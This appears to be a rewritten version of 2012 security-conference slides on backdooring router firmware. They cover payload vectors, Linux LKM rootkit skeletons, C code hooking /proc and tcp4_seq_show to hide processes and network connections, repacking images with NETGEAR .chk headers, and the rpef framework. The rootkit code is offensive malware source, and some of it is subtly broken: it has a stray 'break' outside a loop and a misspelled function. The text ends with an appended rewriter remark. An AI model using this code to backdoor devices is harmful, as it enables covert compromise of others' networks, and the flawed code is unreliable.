# Copyright and Disclaimer
Copyright Â© 2012 Virtual Security Research, LLC.  
All Rights Reserved.

## Getting unsquashfs
### Process Overview
- **Step 1:** Obtain `unsquashfs`.
- **Step 2:** Successfully deploy the payload.

## Payload Vectors
- **Minimalistic Linux System:**
  - **Userland:** Easier to implement, more portable, but less stealthy.
  - **Kernel-land:** More stealthy, requires more development effort, and is less portable.

## Infection via Userland
- **Simple C Backdoor Code:**
  - Drop the backdoor code on the filesystem.
  - The binary is executable across nearly all target systems.
  - Visibility: Files and processes are visible, but connections can be a more significant issue.

## Dropping the Binary
- Deploy the backdoor binary on the target system.

## Infection via Kernel-Land
- **Methods:**
  - Infection via Loadable Kernel Module (LKM).
  - Infection via `/dev/kmem`.
  - Static kernel patching.
- **Considerations:**
  - A bug in the code could cause a Denial of Service (DoS) for the entire network.
  - The payload must be compiled against the target kernel tree.
  - Files, processes, and connections can be hidden.

### Infection via LKM
- **Linux Kernel Module (LKM):**
  - Basic rootkit techniques from old Phrack articles are still relevant:
    - **plaguez:** Weakening the Linux Kernel (Issue #52)
    - **palmers:** Advances in Kernel Hacking (Issue #58)
    - **sd, devik:** Linux On-the-Fly Kernel Patching Without LKM (Issue #58)
    - **tress:** Infecting Loadable Kernel Modules (Issue #61)
  - Older rootkit code (like Adore) can also be used.

#### LKM Structure for Linux 2.4
```c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    // Executed upon LKM load
    // Hook various functions here
    return 0;
}

void cleanup_module(void) {
    // Executed upon LKM unload
    // Uninstall hooks and restore original function pointers here
}

MODULE_LICENSE("GPL");
```

#### LKM Structure for Linux 2.6
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init i_solemnly_swear_that_i_am_up_to_no_good(void) {
    // Executed upon LKM load
    // Hook various functions here
    return 0;
}

static void __exit mischief_managed(void) {
    // Executed upon LKM unload
    // Uninstall hooks and restore original function pointers here
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");
```

### Hiding Processes and Files
- **Hiding Processes:**
  - Hook `/proc`'s `readdir()` and `filldir()` functions.
- **Hiding Connections:**
  - For Linux 2.4, use a method similar to that in Adore-NG.
  - For Linux 2.6, hook the `seq_file` operations.

#### Example Code for Hiding Processes and Files (Linux 2.4/2.6)
```c
typedef int (*readdir_t)(struct file *file, void *dirent, filldir_t filldir);
typedef int (*filldir_t)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

readdir_t o_proc_readdir;
filldir_t o_proc_filldir;

int n_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type) {
    char *endp;
    if (is_hidden_pid(simple_strtol(name, &endp, 10)))
        return 0;
    return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_proc_readdir(struct file *file, void *dirent, filldir_t filldir) {
    o_proc_filldir = filldir;
    return o_proc_readdir(file, dirent, &n_proc_filldir);
}

void hook_proc() {
    struct file *filep;
    filep = filp_open("/proc", O_RDONLY, 0);
    o_proc_readdir = filep->f_op->readdir;
    filep->f_op->readdir = &n_proc_readdir;
    filp_close(filep, 0);
}
```

#### Example Code for Hiding Connections (Linux 2.6)
```c
static int (*o_tcp4_seq_show)(struct seq_file *seq, void *v);

#define TMPSZ 150

static int n_tcp4_seq_show(struct seq_file *seq, void *v) {
    int ret;
    char port[12];
    ret = o_tcp4_seq_show(seq, v);
    sprintf(port, ":%04X", to_hide_port);
    if (srnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
        seq->count -= TMPSZ;
        break;
    }
    return ret;
}

void hook_tcp() {
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;
    filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
    afinfo = PDE(filep->f_dentry->d_inode)->data;
    o_tcp4_seq_show = afinfo->seq_ops.show;
    afinfo->seq_ops.show = &n_tcp4_seq_show;
    filp_close(filep, 0);
}
```

## Repacking the Image
- **Steps:**
  - Rebuild the unpacked filesystem.
  - Append extracted or generated parts together.
  - Pad sections to defined lengths, if necessary.
  - Update metadata as needed.

### Building the Filesystem
- Use the appropriate utility and version to build the filesystem.

### Padding the Image
- Add placeholder headers and pad sections to the required length.

### Updating the Image Metadata
- Ensure the metadata is correctly updated.

## NETGEAR .chk Header
- **Header Structure:**
  - **Magic Number:** `*#$^`
  - **Header Length:** 0x31 (58 bytes)
  - **Reserved:** 02 01 00 02 1a 33 00 3b
  - **Kernel Checksum:** 0a b0 f2 51
  - **Rootfs Checksum:** 00 00 00 00
  - **Kernel Length:** 0x277000 (2,584,576 bytes)
  - **Rootfs Length:** 0
  - **Image Checksum:** 0a b0 f2 51
  - **Header Checksum:** 0f 67 0a dd
  - **Board ID:** U12H139T00_NETGEAR

### Generating a .chk Header
- Use the provided structure to generate the .chk header.

## rpef: The Router Post-Exploitation Framework
- **Overview:**
  - Abstracts and expedites the process of backdooring router firmware images.
  - Project URL: [rpef](http://redmine.poppopret.org/projects/rpef)

## Future Work
- **Enhancements:**
  - Support for more routers and modules.
  - Improved payloads (e.g., VPN/SOCKS, traffic modification, port knocking).
  - Handling arbitrary size and multiple payloads.
  - Static kernel patching.
  - Reverse engineering to overcome roadblocks.
  - Porting binary utilities to Python for OS agnosticism.
  - Integration with other frameworks.

## Acknowledgments
- **Contributors:**
  - Dan Rosenberg (vulnfactory.org)
  - Ian Latter (midnightcode.org)
  - OpenWRT community (openwrt.org)

## Questions?
- Feel free to ask any questions.

---

This optimized text is more structured, clear, and professional, making it easier to read and understand.